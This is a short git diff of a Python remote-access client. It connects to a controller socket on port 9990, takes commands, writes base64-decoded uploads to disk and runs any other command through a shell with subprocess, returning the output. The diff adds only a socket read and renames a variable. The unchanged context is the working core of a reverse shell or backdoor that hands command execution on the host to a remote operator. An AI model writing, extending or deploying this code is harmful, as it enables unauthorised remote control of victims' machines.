@@ -6,6 +6,7 @@ import subprocess
 import time
 from typing import List
 import base64
+
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect(("0.0.0.0", 9990))
 print("Success connect")
@@ -21,9 +22,10 @@ while True:
             client_socket.send(f"Change directory on {list_command[1]}".encode())
             
         elif "upload" in command:
+            file = client_socket.recv(1024)
             list_command = command.split(' ')
-            with open(list_command[1], "wb") as file:
-                file.write(base64.b64decode(list_command[2]))
+            with open(list_command[1], "wb") as file_open:
+                file_open.write(base64.b64decode(list_command[2]))
 
         else:
             ex = subprocess.check_output(command, shell=True).decode()
